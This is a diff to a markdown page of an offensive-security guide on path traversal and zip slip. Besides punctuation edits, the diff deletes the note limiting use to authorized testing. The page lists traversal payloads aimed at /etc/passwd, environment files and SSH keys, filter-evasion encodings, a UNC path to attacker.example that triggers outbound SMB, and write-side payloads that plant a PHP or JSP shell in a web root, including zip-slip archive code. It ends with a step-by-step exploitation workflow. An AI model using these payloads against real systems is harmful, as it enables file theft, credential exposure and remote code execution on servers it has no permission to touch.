@@ -12,9 +12,7 @@ keywords:
 
 # Path traversal
 
-**Path traversal** (directory traversal) exploits application code that builds a filesystem path from untrusted input and resolves it relative to a weak base directory. By injecting `../` sequences, encoded separators, or an absolute path, an attacker escapes the intended root and reaches arbitrary files—reading source, configuration, and credentials, or, where the sink writes, planting content of their choosing. The same primitive applied to archive extraction is **zip slip**.
-
-> **Scope.** For authorized penetration tests, red-team engagements, CTF labs, and code review of systems you own or are contracted to assess. Use only against systems you are permitted to test.
+**Path traversal** (directory traversal) exploits application code that builds a filesystem path from untrusted input and resolves it relative to a weak base directory. By injecting `../` sequences, encoded separators, or an absolute path, an attacker escapes the intended root and reaches arbitrary files, reading source, configuration, and credentials, or, where the sink writes, planting content of their choosing. The same primitive applied to archive extraction is **zip slip**.
 
 ## Overview
 
@@ -32,7 +30,7 @@ The vulnerability exists because **the input controls path structure, not just a
 
 ## Reaching the target
 
-The number of `../` segments need not be exact—resolving past the filesystem root is harmless, so over-supplying is the reliable default:
+The number of `../` segments need not be exact, resolving past the filesystem root is harmless, so over-supplying is the reliable default:
 
 ```
 ../../../../../../../../etc/passwd
@@ -47,7 +45,7 @@ file:///etc/passwd
 \\attacker.example\share\x                     # UNC path on Windows
 ```
 
-High-value read targets depend on the stack: `/etc/passwd`, `/proc/self/environ` and `/proc/self/cmdline`, the application's own source and `.env`, framework secrets, `~/.ssh/id_*`, server logs, and—on cloud hosts—paths that proxy instance metadata.
+High-value read targets depend on the stack: `/etc/passwd`, `/proc/self/environ` and `/proc/self/cmdline`, the application's own source and `.env`, framework secrets, `~/.ssh/id_*`, server logs, and, on cloud hosts, paths that proxy instance metadata.
 
 ## Encoding and filter evasion
 
@@ -62,13 +60,13 @@ Blocklists that strip `../` or reject `/` are routinely defeated because **norma
 | Overlong UTF-8 / Unicode | `%c0%ae%c0%ae/` · fullwidth `．．／` | Decoded to `.` by permissive parsers |
 | Leading-slash strip bypass | `....//....//etc/passwd` | Defeats a single `s/\.\.\///` pass |
 
-**Null-byte truncation** (`%00`) historically cut off an appended extension—`file=../../etc/passwd%00.png` caused the runtime to stop reading at the null and open `passwd`. It still appears on legacy interpreters and some native file APIs.
+**Null-byte truncation** (`%00`) historically cut off an appended extension, `file=../../etc/passwd%00.png` caused the runtime to stop reading at the null and open `passwd`. It still appears on legacy interpreters and some native file APIs.
 
 **Appended-extension bypass.** When code forces a suffix (`$file . ".php"`), combine null-byte truncation where available, or exploit path semantics such as a trailing separator or very long path that the resolver trims.
 
 ## Write-side traversal
 
-Traversal is not read-only. A sink that *writes* to `base + userName`—an upload target, an export path, a cache key, a log filename—lets an attacker choose the destination:
+Traversal is not read-only. A sink that *writes* to `base + userName`, an upload target, an export path, a cache key, a log filename, lets an attacker choose the destination:
 
 ```
 filename = ../../../../var/www/html/shell.php
@@ -95,19 +93,19 @@ z.writestr("../../../../var/www/html/x.jsp", "<%= ... %>")
 z.close()
 ```
 
-Any feature that ingests a user-supplied archive—plugin installers, import/restore flows, document converters—is a candidate. Symlink members in `tar` archives are a related variant: extraction follows the link and writes outside the tree.
+Any feature that ingests a user-supplied archive, plugin installers, import/restore flows, document converters, is a candidate. Symlink members in `tar` archives are a related variant: extraction follows the link and writes outside the tree.
 
 ## Exploitation workflow
 
 1. **Locate a path-bearing parameter.** Download/export endpoints, `?file=`, `?path=`, `?lang=`, avatar and attachment names, archive uploads, and anything that reflects file contents or a filename.
 2. **Confirm traversal.** Request a stable known file (`../../../../etc/hostname`, `/etc/passwd`, `win.ini`) and compare responses to a normal fetch; a differing, file-shaped body confirms escape.
-3. **Fingerprint normalization.** Walk the encoding table above to learn which layer decodes and where the filter sits—this dictates the working payload.
+3. **Fingerprint normalization.** Walk the encoding table above to learn which layer decodes and where the filter sits, this dictates the working payload.
 4. **Pivot by capability.** Read mode → harvest source, config, and secrets, then feed them into [dynamic inclusion](dynamic-file-inclusion.md) or auth attacks. Write mode → place executable content in a served directory for RCE.
 
 ## Platform differences
 
 - **POSIX:** `/` separator, case-sensitive, `/proc` pseudo-files are rich read targets, symlinks commonly followed.
-- **Windows:** accepts both `\` and `/`, case-insensitive, reserved device names (`CON`, `NUL`), UNC paths (`\\host\share`) can trigger outbound SMB, and trailing dots/spaces are trimmed by the resolver—each a filter-evasion lever.
+- **Windows:** accepts both `\` and `/`, case-insensitive, reserved device names (`CON`, `NUL`), UNC paths (`\\host\share`) can trigger outbound SMB, and trailing dots/spaces are trimmed by the resolver, each a filter-evasion lever.
 
 Establishing the host OS and the exact resolver in the call path decides the separator set and the viable tricks before the first crafted request.
 
